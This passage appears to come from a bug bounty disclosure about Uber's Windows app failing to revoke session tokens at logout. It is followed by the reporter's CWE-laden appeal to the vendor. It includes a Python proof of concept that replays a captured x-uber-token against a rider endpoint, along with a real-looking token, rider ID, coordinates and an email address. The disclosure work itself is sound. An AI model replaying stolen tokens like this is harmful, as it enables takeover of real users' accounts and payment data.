This results in the x-uber-token still being active even after a user has logged out, giving an attacker the ability to access and/or modify all aspects of an Uber Rider's (and potentially Driver's) customer information.\n\n## Reproduction Steps\n1. Login using the Microsoft Store Uber App with an interception proxy to capture the session data. Make a note of the issued x-uber-token.\n2. Logout of the Microsoft Store Uber App.\n3. Using the Python POC code below, gain access to the Rider Dispatch View using the x-uber-token issued from Step 1 above:\n\n-----\n\nimport requests\n\nresponse = requests.get(\n    'https://cn-sjc1.uber.com/rt/riders/1ad0f5c1-1ac0-4c2c-a34a-36f267d7ae6f/dispatch-view',\n    headers={                                                                      'accept-encoding': 'gzip, '\n                                                                                              'deflate',\n                                                                           'accept-language': 'en; '\n                                                                                              'q=1.0, '\n                                                                                              'fr; '\n                                                                                              'q=0.9, '\n                                                                                              'de; '\n                                                                                              'q=0.8, '\n                                                                                              'zh-Hans; '\n                                                                                              'q=0.7, '\n                                                                                              'zh-Hant; '\n                                                                                              'q=0.6, '\n                                                                                              'ja; '\n                                                                                              'q=0.5',\n                                                                           'charset': 'utf-8',\n                                                                           'user-agent': 'client/windows-phone/0.0.0.',\n                                                                           'x-uber-client-name': 'client',\n                                                                           'x-uber-client-version': '6.2.8',\n                                                                           'x-uber-device': 'windows-phone',\n                                                                           'x-uber-device-epoch': '1511637222701',\n                                                                           'x-uber-device-language': 'en',\n                                                                           'x-uber-device-location-altitude': '100',\n                                                                           'x-uber-device-location-latitude': '37.4291076516301',\n                                                                           'x-uber-device-location-longitude': '-77.5513191759734',\n                                                                           'x-uber-device-model': 'LENOVO '\n                                                                                                  '80TJ',\n                                                                           'x-uber-device-os': '10.0.16299',\n                                                                           'x-uber-token': '5ead9f1ab28780d48f8caa9d41a22973'}\n)\n\nprint(response.text)\n\n-----\n\n## Specifics\n* GregPerry804@gmail.com was the account used for this attack.\n* All Uber customer endpoints used by the Microsoft Store Uber App will still accept a x-uber-token as valid, after the user has signed off/logged out of their Microsoft Store Uber App session.\n\n## Impact\n\nAn attacker with access to a previously used x-uber-token, even after the user has logged out of the Microsoft Store Uber App, can still modify a rider's profile, access previous trip histories, schedule and/or cancel Uber driver dispatches, and access and/or modify stored payment information.\n\nDriver functionality was not tested. If the Uber Driver role is also implemented within the Microsoft Phone Architecture Uber App, then all functionality encapsulated within the app as relates to driver functionality could be observed and/or modified as well.\n\nGiven the lack of certificate pinning in the Microsoft Store Uber App, this vulnerability is not theoretical and with x-uber-tokens easily harvested at public WiFi hotspots where the app is being used.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary\u003c/h2\u003e\n\n\u003cp\u003eThe Microsoft Store Uber App (Windows Phone Architecture) does not properly revoke or expire a rider\u0026#39;s x-uber-token upon app signout.\u003c/p\u003e\n\n\u003ch2 id=\"security-impact\"\u003eSecurity Impact\u003c/h2\u003e\n\n\u003cp\u003eWhen a user logs out/signs off of the app, the logout process is handled only locally on the application side, and without any type of x-uber-token revocation or expiration at the Uber customer endpoint.

The consequences will vary, depending on what the mechanisms are trying to protect.\n\nCWE-539: Information Exposure Through Persistent Cookies\n\nhttps://cwe.mitre.org/data/definitions/539.html\n\nCookies are small bits of data that are sent by the web application but stored locally in the browser. This lets the application use the cookie to pass information between pages and store variable information. The web application controls what information is stored in a cookie and how it is used. Typical types of information stored in cookies are session Identifiers, personalization and customization information, and in rare cases even usernames to enable automated logins. There are two different types of cookies: session cookies and persistent cookies. Session cookies just live in the browser's memory, and are not stored anywhere, but persistent cookies are stored on the browser's hard drive.\n\nCWE-384: Session Fixation\n\nhttps://cwe.mitre.org/data/definitions/384.html\n\nSuch a scenario is commonly observed when:\n1. A web application authenticates a user without first invalidating the existing session, thereby continuing to use the session already associated with the user.\n2. An attacker is able to force a known session identifier on a user so that, once the user authenticates, the attacker has access to the authenticated session.\n3. The application or container uses predictable session identifiers. In the generic exploit of session fixation vulnerabilities, an attacker creates a new session on a web application and records the associated session identifier. The attacker then causes the victim to associate, and possibly authenticate, against the server using that session identifier, giving the attacker access to the user's account through the active session.\n\nCWE-613: Insufficient Session Expiration\n\nhttps://cwe.mitre.org/data/definitions/613.html\n\nAccording to WASC, \"Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.\"\n\nThe lack of proper session expiration may improve the likely success of certain attacks. For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser's back button to access web pages previously accessed by the victim.\n\nCWE-262: Not Using Password Aging\n\nhttps://cwe.mitre.org/data/definitions/262.html\n\nIf no mechanism is in place for managing password aging, users will have no incentive to update passwords in a timely manner.\n\nThe recommendation that users change their passwords regularly and do not reuse passwords is universal among security experts. In order to enforce this, it is useful to have a password aging mechanism that notifies users when passwords are considered old and that requests that they replace them with new, strong passwords. In order for this functionality to be useful, however, it must be accompanied with documentation which stresses how important this practice is and which makes the entire process as simple as possible for the user.\n\nCWE-263: Password Aging with Long Expiration\n\nhttps://cwe.mitre.org/data/definitions/263.html\n\nJust as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked. Passwords must be given a maximum life span, after which a user is required to update with a new and different password.","markdown_message":"\u003cp\u003eHello Rob,\u003c/p\u003e\n\n\u003cp\u003eThis is a significant vulnerability then, irrespective of the intent to migrate to a better system in the future.\u003c/p\u003e\n\n\u003cp\u003eIn your production environment I have identified an implementation error that negates the entire premise behind the increased security associated with replacing cookies with Oath-style bearer tokens.\u003c/p\u003e\n\n\u003cp\u003ePut another way, if I performed a web application penetration test and discovered that cookies weren’t being expired, and the CSO responded that “we don’t ever expire cookies unless the user changes their password”, I would seriously question his or her credibility in the security field.\u003c/p\u003e\n\n\u003cp\u003eThis implementation error maps to several very explicit Common Vulnerabilities and Exposures (CVE) definitions, has not been disclosed in any prior public report that I am aware of, and is currently in use on your production network.\u003c/p\u003e\n\n\u003cp\u003eI have highlighted a few of the impacts below from the CVE database, in addition to highlighting the fact that this particular issue is #2 on the 2017 OWASP Top 10.\u003c/p\u003e\n\n\u003cp\u003ePlease reconsider your decision to close out this issue without acknowledgment. \u003c/p\u003e\n\n\u003cp\u003eRegards,\u003c/p\u003e\n\n\u003cp\u003eGreg\u003c/p\u003e\n\n\u003chr\u003e\n\n\u003cp\u003eNumber 2 in the OWASP Top 10 Application Security Risks 2017: A2:2017 Broken Authentication\u003c/p\u003e\n\n\u003cp\u003eApplication functions related to authentication and session management are often implemented\u003cbr\u003e\nincorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit\u003cbr\u003e\nother implementation flaws to assume other users’ identities temporarily or permanently.\u003c/p\u003e\n\n\u003cp\u003eCWE-602: Client-Side Enforcement of Server-Side Security\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://cwe.mitre.org/data/definitions/602.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F602.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/602.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server.

For example, an attacker may intercept a session ID, possibly via a network sniffer or Cross-site Scripting attack. Although short session expiration times do not help if a stolen token is immediately used, they will protect against ongoing replaying of the session ID. In another scenario, a user might access a web site from a shared computer (such as at a library, Internet cafe, or open work environment). Insufficient Session Expiration could allow an attacker to use the browser\u0026#39;s back button to access web pages previously accessed by the victim.\u003c/p\u003e\n\n\u003cp\u003eCWE-262: Not Using Password Aging\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://cwe.mitre.org/data/definitions/262.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F262.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/262.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIf no mechanism is in place for managing password aging, users will have no incentive to update passwords in a timely manner.\u003c/p\u003e\n\n\u003cp\u003eThe recommendation that users change their passwords regularly and do not reuse passwords is universal among security experts. In order to enforce this, it is useful to have a password aging mechanism that notifies users when passwords are considered old and that requests that they replace them with new, strong passwords. In order for this functionality to be useful, however, it must be accompanied with documentation which stresses how important this practice is and which makes the entire process as simple as possible for the user.\u003c/p\u003e\n\n\u003cp\u003eCWE-263: Password Aging with Long Expiration\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://cwe.mitre.org/data/definitions/263.html\" href=\"/redirect?url=https%3A%2F%2Fcwe.mitre.org%2Fdata%2Fdefinitions%2F263.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://cwe.mitre.org/data/definitions/263.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eJust as neglecting to include functionality for the management of password aging is dangerous, so is allowing password aging to continue unchecked.
